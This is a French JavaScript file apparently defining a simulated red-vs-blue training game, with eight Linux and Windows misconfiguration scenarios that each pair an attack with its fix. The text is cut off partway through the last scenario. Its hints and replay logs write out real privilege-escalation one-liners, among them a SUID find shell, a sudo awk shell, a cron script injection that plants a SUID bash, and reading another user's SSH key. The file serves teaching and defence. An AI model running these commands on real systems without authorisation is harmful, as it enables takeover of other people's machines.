/* =========================================================
   RED vs BLUE — données des scénarios + utilitaires VFS
   ========================================================= */
// Pour les curieux qui lisent le code source jusqu'ici :
// RkxBR3tsZV9jb2RlX3NvdXJjZV9lc3RfYXVzc2lfdW5lX3N1cmZhY2VfZGF0dGFxdWV9

function permAllows(bit, action){
  const map = {r:4,w:2,x:1};
  return (bit & map[action]) !== 0;
}
function permDigits(perm){ return perm.split('').map(d=>parseInt(d,10)); }

function rwxTriplet(digit, isOwnerAndSuid){
  let r = permAllows(digit,'r') ? 'r':'-';
  let w = permAllows(digit,'w') ? 'w':'-';
  let x = permAllows(digit,'x') ? 'x':'-';
  if(isOwnerAndSuid){ x = (x==='x') ? 's' : 'S'; }
  return r+w+x;
}
function formatLs(node){
  const d = permDigits(node.perm);
  const type = node.type==='dir' ? 'd' : '-';
  const owner = rwxTriplet(d[0], node.suid===true);
  const group = rwxTriplet(d[1], false);
  const other = rwxTriplet(d[2], false);
  return `${type}${owner}${group}${other} 1 ${node.owner} ${node.group||node.owner} ${String(node.size||4096).padStart(6)} Jan 10 09:00 `;
}

function canRead(node, state){
  if(state.isRoot) return true;
  const d = permDigits(node.perm);
  if(node.owner === state.user) return permAllows(d[0],'r');
  return permAllows(d[2],'r');
}
function canWrite(node, state){
  if(state.isRoot) return true;
  const d = permDigits(node.perm);
  if(node.owner === state.user) return permAllows(d[0],'w');
  return permAllows(d[2],'w');
}

function resolvePath(cwd, p){
  if(!p) return cwd;
  let parts;
  if(p.startsWith('/')) parts = p.split('/').filter(Boolean);
  else parts = (cwd+'/'+p).split('/').filter(Boolean);
  const stack=[];
  for(const part of parts){
    if(part==='.') continue;
    if(part==='..') stack.pop();
    else stack.push(part);
  }
  return '/'+stack.join('/');
}

const SCENARIOS = [

/* ===================== 1. SUID find ===================== */
{
  id:'suid-find',
  title:'Le binaire SUID qui ne devrait pas l\'être',
  category:'Permissions SUID',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Un audit rapide du système révèle un binaire portant le bit SUID root là où il ne devrait jamais être présent. Localisez-le, puis exploitez-le pour obtenir un shell root.",
    hints:[
      "La commande `find / -perm -4000 2>/dev/null` liste tous les fichiers portant le bit SUID.",
      "/usr/bin/find lui-même possède un SUID root — ce n'est absolument pas son comportement par défaut.",
      "GTFOBins référence une technique d'évasion : `find . -exec /bin/sh -p \\;` spawn un shell avec les privilèges du propriétaire du binaire."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Retirez le bit SUID inutile sur /usr/bin/find, sans casser l'utilisation normale de la commande (recherche de fichiers).",
    hints:[
      "`chmod u-s /usr/bin/find` retire uniquement le bit SUID, sans toucher aux droits d'exécution normaux.",
      "Vérifiez avec `ls -la /usr/bin/find` : le 's' du triplet propriétaire doit redevenir un 'x'."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','usr','root']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
      '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['find','ls','cat']},
      '/usr/bin/find':{type:'file',perm:'755',owner:'root',suid:true,size:157832,content:'[binaire GNU findutils]'},
      '/usr/bin/ls':{type:'file',perm:'755',owner:'root',suid:false,size:142000,content:'[binaire coreutils]'},
      '/usr/bin/cat':{type:'file',perm:'755',owner:'root',suid:false,size:35000,content:'[binaire coreutils]'},
      '/root':{type:'dir',perm:'700',owner:'root',children:['flag.txt']},
      '/root/flag.txt':{type:'file',perm:'600',owner:'root',size:40,content:'FLAG{suid_find_gtfobins_root}\n'}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^find\s+\S*\s*-exec\s*\/bin\/sh\s*-p\s*\\?;?$/, run(state, print){
        const findNode = state.vfs['/usr/bin/find'];
        if(!findNode || !findNode.suid){
          print("find: aucun bit SUID sur ce binaire, l'exploitation échoue.", 'err');
          return;
        }
        state.isRoot = true;
        state.user = 'root';
        print("[+] find lance un sous-shell avec les privilèges du propriétaire du binaire (root).", 'ok');
        print("[+] Shell root obtenu.", 'ok');
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return state.vfs['/usr/bin/find'].suid !== true; },
  replay(state){
    const log=[];
    const suid = state.vfs['/usr/bin/find'].suid === true;
    log.push({t:"$ find . -exec /bin/sh -p \\;", cls:'prompt-line'});
    if(suid){
      log.push({t:"[+] find lance un sous-shell avec les privilèges du propriétaire du binaire (root).", cls:'ok'});
      log.push({t:"[+] Shell root obtenu.", cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:"find: -exec exécute la commande avec vos propres privilèges (aucun SUID détecté).", cls:'err'});
      log.push({t:"[-] Échec de l'élévation de privilèges.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 2. Cron writable ===================== */
{
  id:'cron-writable',
  title:'Le script de sauvegarde modifiable par tous',
  category:'Tâche planifiée (cron)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Une tâche cron exécutée par root appelle un script dont les permissions sont trop permissives. Modifiez ce script pour qu'il vous fournisse un shell root à la prochaine exécution planifiée.",
    hints:[
      "`cat /etc/cron.d/backup` révèle qu'un script est exécuté par root chaque minute.",
      "`ls -la /opt/backup.sh` montre des permissions 766 : le fichier est modifiable par tout le monde.",
      "`nano /opt/backup.sh` permet d'ajouter des lignes qui créeront un binaire SUID root : par exemple copier /bin/bash puis lui appliquer un bit SUID.",
      "Une fois le script modifié, tapez `attendre-cron` pour simuler l'exécution planifiée, puis lancez le binaire obtenu avec l'option -p."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Corrigez les permissions de /opt/backup.sh afin qu'il ne soit plus modifiable par un utilisateur non privilégié, tout en restant exécutable par la tâche cron root.",
    hints:[
      "`chmod 700 /opt/backup.sh` retire tout droit d'écriture au groupe et aux autres, en ne laissant que root agir dessus.",
      "Le fichier appartient déjà à root : seul l'accès en écriture pour les autres utilisateurs posait problème."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','opt','etc','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/opt':{type:'dir',perm:'755',owner:'root',children:['backup.sh']},
      '/opt/backup.sh':{type:'file',perm:'766',owner:'root',size:120,
        content:"#!/bin/bash\n# Sauvegarde quotidienne\nrsync -a /data /backup/\n"},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['cron.d']},
      '/etc/cron.d':{type:'dir',perm:'755',owner:'root',children:['backup']},
      '/etc/cron.d/backup':{type:'file',perm:'644',owner:'root',size:40,
        content:"* * * * * root /opt/backup.sh\n"},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^nano\s+\/opt\/backup\.sh$/, run(state, print, openNano){ openNano('/opt/backup.sh'); } },
    { pattern:/^(vi|vim)\s+\/opt\/backup\.sh$/, run(state, print, openNano){ openNano('/opt/backup.sh'); } },
    { pattern:/^attendre-cron$|^sleep\s+\d+$/, run(state, print){
        const script = state.vfs['/opt/backup.sh'];
        const injected = /\/tmp\/rootbash/.test(script.content) && /chmod\s+u\+s/.test(script.content);
        print("[cron] exécution planifiée de /opt/backup.sh par root (* * * * *)...", 'info');
        if(injected){
          state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
          if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
          print("[cron] script exécuté avec succès.", 'info');
          print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
        } else {
          print("[cron] script exécuté avec succès (rien d'anormal détecté).", 'info');
        }
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user='root';
          print("[+] Shell root obtenu via /tmp/rootbash -p.", 'ok');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const perm = state.vfs['/opt/backup.sh'].perm;
    const d = permDigits(perm);
    return !permAllows(d[1],'w') && !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const script = state.vfs['/opt/backup.sh'];
    const d = permDigits(script.perm);
    const writable = permAllows(d[1],'w') || permAllows(d[2],'w');
    log.push({t:`$ echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' >> /opt/backup.sh`, cls:'prompt-line'});
    if(!writable){
      log.push({t:"bash: /opt/backup.sh: Permission non accordée", cls:'err'});
      log.push({t:"[-] Impossible d'altérer le script : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[cron] exécution planifiée de /opt/backup.sh par root...", cls:'info'});
    log.push({t:"[+] /tmp/rootbash créé avec un bit SUID root.", cls:'ok'});
    log.push({t:"$ /tmp/rootbash -p", cls:'prompt-line'});
    log.push({t:"[+] Shell root obtenu.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 3. Sudo NOPASSWD GTFOBin ===================== */
{
  id:'sudo-awk',
  title:'Une règle sudo NOPASSWD sur un GTFOBin',
  category:'Configuration sudo',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Une règle sudo mal calibrée vous autorise à exécuter un interpréteur comme root, sans mot de passe. Utilisez `sudo -l` pour l'identifier, puis exploitez-le pour obtenir un shell root.",
    hints:[
      "`sudo -l` liste les commandes que vous pouvez exécuter en tant que root.",
      "/usr/bin/awk est autorisé en NOPASSWD : GTFOBins référence une évasion via `sudo awk 'BEGIN {system(\"/bin/sh\")}'`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Modifiez la règle sudo de bob afin qu'elle n'autorise plus l'exécution libre d'un interpréteur en NOPASSWD.",
    hints:[
      "Ouvrez le fichier avec `nano /etc/sudoers.d/bob`.",
      "Supprimez purement la ligne concernant awk, ou retirez le mot-clé NOPASSWD pour exiger un mot de passe."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['sudoers.d']},
      '/etc/sudoers.d':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/etc/sudoers.d/bob':{type:'file',perm:'440',owner:'root',size:60,
        content:"bob ALL=(root) NOPASSWD: /usr/bin/awk\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^sudo\s+-l$/, run(state, print){
        print(`Utilisateur ${state.user} peut exécuter les commandes suivantes sur target-lab :`, 'out');
        print(state.vfs['/etc/sudoers.d/bob'].content.trimEnd(), 'out');
      }
    },
    { pattern:/^sudo\s+awk\s+.*system\(.*\/bin\/sh.*$/, run(state, print){
        const rule = state.vfs['/etc/sudoers.d/bob'].content;
        if(/NOPASSWD.*awk/.test(rule)){
          state.isRoot = true; state.user = 'root';
          print("[+] awk exécute system(\"/bin/sh\") en tant que root, sans mot de passe.", 'ok');
          print("[+] Shell root obtenu.", 'ok');
        } else if(/awk/.test(rule)){
          print("[sudo] un mot de passe est requis pour bob", 'err');
        } else {
          print("Sorry, user bob is not allowed to execute '/usr/bin/awk'.", 'err');
        }
      }
    },
    { pattern:/^nano\s+\/etc\/sudoers\.d\/bob$/, run(state, print, openNano){ openNano('/etc/sudoers.d/bob'); } },
    { pattern:/^(vi|vim)\s+\/etc\/sudoers\.d\/bob$/, run(state, print, openNano){ openNano('/etc/sudoers.d/bob'); } }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const rule = state.vfs['/etc/sudoers.d/bob'].content;
    return !/NOPASSWD\s*:\s*\/usr\/bin\/awk/.test(rule);
  },
  replay(state){
    const log=[];
    const rule = state.vfs['/etc/sudoers.d/bob'].content;
    log.push({t:`$ sudo awk 'BEGIN {system("/bin/sh")}'`, cls:'prompt-line'});
    if(/NOPASSWD\s*:\s*\/usr\/bin\/awk/.test(rule)){
      log.push({t:"[+] awk exécute system(\"/bin/sh\") en tant que root, sans mot de passe.", cls:'ok'});
      log.push({t:"[+] Shell root obtenu.", cls:'ok'});
      return {log, success:true};
    } else if(/awk/.test(rule)){
      log.push({t:"[sudo] un mot de passe est requis pour bob", cls:'err'});
      log.push({t:"[-] L'attaquant ne connaît pas le mot de passe root.", cls:'err'});
      return {log, success:false};
    } else {
      log.push({t:"Sorry, user bob is not allowed to execute '/usr/bin/awk'.", cls:'err'});
      log.push({t:"[-] La règle sudo a été retirée.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 4. SSH key world readable ===================== */
{
  id:'ssh-key-exposed',
  title:'Une clé privée SSH lisible par tous',
  category:'Permissions fichiers sensibles',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"La clé privée SSH d'alice est présente sur le système avec des permissions bien trop ouvertes. Exfiltrez son contenu.",
    hints:[
      "`ls -la /home/alice/.ssh/` montre les permissions du fichier id_rsa.",
      "Un simple `cat /home/alice/.ssh/id_rsa` suffit si le fichier est lisible par tous (permissions se terminant par un chiffre incluant le bit lecture)."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Restreignez les permissions de la clé privée d'alice afin que seule elle puisse la lire.",
    hints:[
      "`chmod 600 /home/alice/.ssh/id_rsa` : lecture et écriture réservées au seul propriétaire."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob','alice']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/home/alice':{type:'dir',perm:'755',owner:'alice',children:['.ssh']},
      '/home/alice/.ssh':{type:'dir',perm:'755',owner:'alice',children:['id_rsa']},
      '/home/alice/.ssh/id_rsa':{type:'file',perm:'644',owner:'alice',size:2602,
        content:"-----BEGIN OPENSSH PRIVATE KEY-----\n[clé simulée à des fins pédagogiques — non fonctionnelle]\n-----END OPENSSH PRIVATE KEY-----\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[],
  onCat(state, node, path, print){
    if(path === '/home/alice/.ssh/id_rsa' && state.user !== 'alice' && !state.isRoot){
      state.flags = state.flags||{};
      state.flags.keyRead = true;
      print("[+] Clé privée exfiltrée avec succès.", 'ok');
      print("FLAG{cle_ssh_exposee_permissions_644}", 'flagline');
    }
  },
  attackCheck(state){ return state.flags && state.flags.keyRead === true; },
  defenseCheck(state){
    const perm = state.vfs['/home/alice/.ssh/id_rsa'].perm;
    const d = permDigits(perm);
    return !permAllows(d[1],'r') && !permAllows(d[2],'r');
  },
  replay(state){
    const log=[];
    const perm = state.vfs['/home/alice/.ssh/id_rsa'].perm;
    const d = permDigits(perm);
    log.push({t:"$ cat /home/alice/.ssh/id_rsa", cls:'prompt-line'});
    if(permAllows(d[2],'r') || permAllows(d[1],'r')){
      log.push({t:"-----BEGIN OPENSSH PRIVATE KEY----- [...]", cls:'out'});
      log.push({t:"[+] Clé privée exfiltrée avec succès.", cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:"cat: /home/alice/.ssh/id_rsa: Permission non accordée", cls:'err'});
      log.push({t:"[-] La clé n'est plus accessible qu'à son propriétaire.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 5. NFS no_root_squash ===================== */
{
  id:'nfs-no-root-squash',
  title:'Un partage NFS exporté sans restriction',
  category:'Partage réseau (NFS)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Un partage NFS est exporté avec l'option no_root_squash, qui fait confiance au compte root du client. Montez le partage, puis exploitez cette confiance pour obtenir un accès root sur le serveur.",
    hints:[
      "`showmount -e target-lab` liste les exports NFS disponibles et leurs options.",
      "`mount -t nfs target-lab:/data /mnt` monte le partage localement.",
      "Avec no_root_squash, le compte root de votre propre machine est traité comme root sur le partage : `touch /mnt/pwn`, puis `chown root /mnt/pwn` et `chmod u+s /mnt/pwn` créent un binaire SUID root exploitable via `/mnt/pwn -p`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Corrigez l'export NFS dans /etc/exports afin que le root du client ne soit plus mappé sur le root du serveur.",
    hints:[
      "Ouvrez `/etc/exports` avec `nano` et remplacez `no_root_squash` par `root_squash`, ou retirez simplement l'option."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','mnt']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['exports']},
      '/etc/exports':{type:'file',perm:'644',owner:'root',size:60,content:"/data *(rw,no_root_squash,insecure)\n"},
      '/mnt':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^showmount\s+-e(\s+\S+)?$/, run(state, print){
        print('Export list for target-lab:', 'out');
        print(state.vfs['/etc/exports'].content.trimEnd(), 'out');
      }
    },
    { pattern:/^mount\s+-t\s+nfs\s+\S+:\/data\s+\/mnt$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.mounted = true;
        print('[+] /data monté sur /mnt.', 'ok');
      }
    },
    { pattern:/^chown\s+root(:root)?\s+\/mnt\/pwn$/, run(state, print){
        const node = state.vfs['/mnt/pwn'];
        if(!node){ print("chown: /mnt/pwn: Aucun fichier ou dossier de ce type", 'err'); return; }
        if(/no_root_squash/.test(state.vfs['/etc/exports'].content)){
          node.owner = 'root';
          print('[+] no_root_squash actif : votre root local est mappé sur le root distant.', 'ok');
          print('[+] Propriétaire de /mnt/pwn réglé sur root.', 'ok');
        } else {
          print("chown: changing ownership of '/mnt/pwn': Operation not permitted", 'err');
        }
      }
    },
    { pattern:/^chmod\s+u\+s\s+\/mnt\/pwn$/, run(state, print){
        const node = state.vfs['/mnt/pwn'];
        if(!node){ print("chmod: /mnt/pwn: Aucun fichier ou dossier de ce type", 'err'); return; }
        if(node.owner === 'root'){
          node.suid = true;
          print('[+] Bit SUID ajouté sur /mnt/pwn (propriétaire root).', 'ok');
        } else {
          print("chmod: changing permissions of '/mnt/pwn': Operation not permitted", 'err');
        }
      }
    },
    { pattern:/^\/mnt\/pwn\s+-p$/, run(state, print){
        const node = state.vfs['/mnt/pwn'];
        if(node && node.suid && node.owner === 'root'){
          state.isRoot = true; state.user = 'root';
          print('[+] Shell root obtenu via /mnt/pwn -p.', 'ok');
        } else {
          print('bash: /mnt/pwn: Aucun fichier ou dossier de ce type', 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return !/no_root_squash/.test(state.vfs['/etc/exports'].content); },
  replay(state){
    const log=[];
    const vulnerable = /no_root_squash/.test(state.vfs['/etc/exports'].content);
    log.push({t:'$ mount -t nfs target-lab:/data /mnt && touch /mnt/pwn', cls:'prompt-line'});
    log.push({t:'[+] /data monté sur /mnt.', cls:'info'});
    if(!vulnerable){
      log.push({t:"chown: changing ownership of '/mnt/pwn': Operation not permitted", cls:'err'});
      log.push({t:'[-] root_squash actif : le root client est mappé sur nobody. Échec.', cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] chown root /mnt/pwn réussi (no_root_squash).', cls:'ok'});
    log.push({t:'[+] chmod u+s /mnt/pwn réussi.', cls:'ok'});
    log.push({t:'$ /mnt/pwn -p', cls:'prompt-line'});
    log.push({t:'[+] Shell root obtenu.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 6. Transfert de zone DNS (AXFR) ===================== */
{
  id:'dns-axfr',
  title:'Un transfert de zone DNS ouvert à tous',
  category:'Service DNS',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Le serveur DNS autorise les transferts de zone AXFR depuis n'importe quelle adresse. Récupérez l'intégralité de la zone pour cartographier l'infrastructure interne.",
    hints:[
      "`cat /etc/bind/named.conf.options` montre la configuration du serveur DNS.",
      "`dig axfr target-lab.local @target-lab` demande un transfert de zone complet si le serveur l'autorise à tous (`allow-transfer { any; };`)."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Restreignez les transferts de zone à la seule adresse du serveur secondaire légitime.",
    hints:[
      "Ouvrez `/etc/bind/named.conf.options` avec `nano` et remplacez `allow-transfer { any; };` par l'adresse IP précise du serveur secondaire, par exemple `allow-transfer { 10.0.0.9; };`."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['bind']},
      '/etc/bind':{type:'dir',perm:'755',owner:'root',children:['named.conf.options']},
      '/etc/bind/named.conf.options':{type:'file',perm:'644',owner:'root',size:90,
        content:"zone \"target-lab.local\" {\n  type master;\n  allow-transfer { any; };\n};\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^dig\s+axfr\s+target-lab\.local(\s+@\S+)?$/, run(state, print){
        const conf = state.vfs['/etc/bind/named.conf.options'].content;
        if(/allow-transfer\s*\{\s*any\s*;\s*\}/.test(conf)){
          print('; transfert de zone target-lab.local', 'out');
          print('target-lab.local. 3600 IN SOA ns1.target-lab.local. admin.target-lab.local. (...)', 'out');
          print('target-lab.local. 3600 IN NS ns1.target-lab.local.', 'out');
          print('admin-panel.target-lab.local. 3600 IN A 10.0.0.5', 'out');
          print('backup-srv.target-lab.local. 3600 IN A 10.0.0.7', 'out');
          state.flags = state.flags || {};
          state.flags.zoneLeaked = true;
          print('[+] Zone complète exfiltrée : la topologie interne est cartographiée.', 'ok');
          print('FLAG{axfr_transfert_de_zone_ouvert}', 'flagline');
        } else {
          print('; Transfer failed.', 'err');
          print('[-] Le serveur refuse le transfert depuis cette adresse.', 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.zoneLeaked === true; },
  defenseCheck(state){ return !/allow-transfer\s*\{\s*any\s*;\s*\}/.test(state.vfs['/etc/bind/named.conf.options'].content); },
  replay(state){
    const log=[];
    const conf = state.vfs['/etc/bind/named.conf.options'].content;
    log.push({t:'$ dig axfr target-lab.local @target-lab', cls:'prompt-line'});
    if(/allow-transfer\s*\{\s*any\s*;\s*\}/.test(conf)){
      log.push({t:'; transfert de zone target-lab.local', cls:'out'});
      log.push({t:'[+] Zone complète exfiltrée.', cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:'; Transfer failed.', cls:'err'});
      log.push({t:'[-] Transfert refusé : accès désormais restreint.', cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 7. Bind LDAP anonyme ===================== */
{
  id:'ldap-anonymous-bind',
  title:'Un bind LDAP anonyme laissé actif',
  category:'Annuaire LDAP',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"L'annuaire LDAP accepte les connexions anonymes (bind anonyme). Interrogez-le sans identifiants pour en extraire le contenu.",
    hints:[
      "`cat /etc/ldap/slapd.conf` montre si le bind anonyme est autorisé.",
      "`ldapsearch -x -H ldap://target-lab -b \"dc=target-lab,dc=local\"` interroge l'annuaire sans authentification."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Désactivez le bind anonyme pour forcer une authentification sur l'annuaire.",
    hints:[
      "Ouvrez `/etc/ldap/slapd.conf` avec `nano` et passez `allow_anonymous_bind` à `false`."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ldap']},
      '/etc/ldap':{type:'dir',perm:'755',owner:'root',children:['slapd.conf']},
      '/etc/ldap/slapd.conf':{type:'file',perm:'644',owner:'root',size:60,
        content:"suffix \"dc=target-lab,dc=local\"\nallow_anonymous_bind = true\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^ldapsearch\s+-x\s+-H\s+ldap:\/\/target-lab\s+-b\s+"dc=target-lab,dc=local"$/, run(state, print){
        const conf = state.vfs['/etc/ldap/slapd.conf'].content;
        if(/allow_anonymous_bind\s*=\s*true/i.test(conf)){
          print('dn: uid=alice,ou=people,dc=target-lab,dc=local', 'out');
          print('uid: alice', 'out');
          print('mail: alice@target-lab.local', 'out');
          print('dn: uid=svc-backup,ou=services,dc=target-lab,dc=local', 'out');
          print('uid: svc-backup', 'out');
          print('description: compte de service sauvegarde', 'out');
          state.flags = state.flags || {};
          state.flags.ldapLeaked = true;
          print("[+] Annuaire interrogé sans authentification : liste des comptes exfiltrée.", 'ok');
          print('FLAG{ldap_bind_anonyme_expose}', 'flagline');
        } else {
          print('ldap_bind: Insufficient access (50)', 'err');
          print("[-] Le bind anonyme n'est plus autorisé.", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.ldapLeaked === true; },
  defenseCheck(state){ return !/allow_anonymous_bind\s*=\s*true/i.test(state.vfs['/etc/ldap/slapd.conf'].content); },
  replay(state){
    const log=[];
    const conf = state.vfs['/etc/ldap/slapd.conf'].content;
    log.push({t:'$ ldapsearch -x -H ldap://target-lab -b "dc=target-lab,dc=local"', cls:'prompt-line'});
    if(/allow_anonymous_bind\s*=\s*true/i.test(conf)){
      log.push({t:'dn: uid=alice,ou=people,dc=target-lab,dc=local', cls:'out'});
      log.push({t:'[+] Annuaire exfiltré sans authentification.', cls:'ok'});
      return {log, success:true};
    } else {
      log.push({t:'ldap_bind: Insufficient access (50)', cls:'err'});
      log.push({t:"[-] Authentification désormais requise.", cls:'err'});
      return {log, success:false};
    }
  }
},

/* ===================== 8. Chemin de service non guillemeté (Windows) ===================== */
{
  id:'windows-unquoted-path',
  title:'Un chemin de service non guillemeté',
  category:'Service Windows (partage monté)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Un service Windows démarre automatiquement en tant que SYSTEM avec un chemin d'exécutable non guillemeté, dans un dossier accessible en écriture. Déposez un exécutable piégé sur le chemin de recherche, puis provoquez le redémarrage du service.",
    hints:[
      "`cat /etc/services-config/updater.conf` montre le chemin binaire du service et le compte utilisé (SYSTEM).",
      "`ls -la \"/mnt/c/Program Files\"` révèle que ce dossier intermédiaire est ouvert en écriture à tous.",
      "Windows interprète un chemin non guillemeté contenant des espaces en essayant plusieurs candidats : déposez votre fichier à l'un de ces emplacements intermédiaires avec `touch \"/mnt/c/Program Files/Common.exe\"`.",
      "Ensuite, `restart-service UpdaterSvc` simule le redémarrage : s'il trouve votre fichier avant le vrai binaire, il l'exécute en tant que SYSTEM."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Corrigez la permission du dossier intermédiaire afin qu'il ne soit plus modifiable par un utilisateur non privilégié.",
    hints:[
      "`chmod 755 \"/mnt/c/Program Files\"` retire le droit d'écriture pour le groupe et les autres."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','mnt']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['services-config']},
      '/etc/services-config':{type:'dir',perm:'755',owner:'root',children:['updater.conf']},
      '/etc/services-config/updater.conf':{type:'file',perm:'644',owner:'root',size:140,
        content:"Service : UpdaterSvc\nCompte : NT AUTHORITY\\SYSTEM\nDémarrage : Automatique\nChemin (non guillemeté) : C:\\Program Files\\Common Files\\Updater Service\\updater.exe\n"},
      '/mnt':{type:'dir',perm:'755',owner:'root',children:['c']},
      '/mnt/c':{type:'dir',perm:'755',owner:'root',children:['Program Files']},
      '/mnt/c/Program Files':{type:'dir',perm:'777',owner:'root',children:['Common Files']},
      '/mnt/c/Program Files/Common Files':{type:'dir',perm:'755',owner:'root',children:['Updater Service']},
      '/mnt/c/Program Files/Common Files/Updater Service':{type:'dir',perm:'755',owner:'root',children:['updater.exe']},
      '/mnt/c/Program Files/Common Files/Updater Service/updater.exe':{type:'file',perm:'755',owner:'root',size:88000,content:'[binaire légitime]'}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^(restart-service|net start|sc start)\s+UpdaterSvc$/i, run(state, print){
        const planted = state.vfs['/mnt/c/Program Files/Common.exe'];
        print('[service] arrêt de UpdaterSvc...', 'info');
        print('[service] recherche du binaire (chemin non guillemeté)...', 'info');
        if(planted){
          state.isRoot = true; state.user = 'SYSTEM';
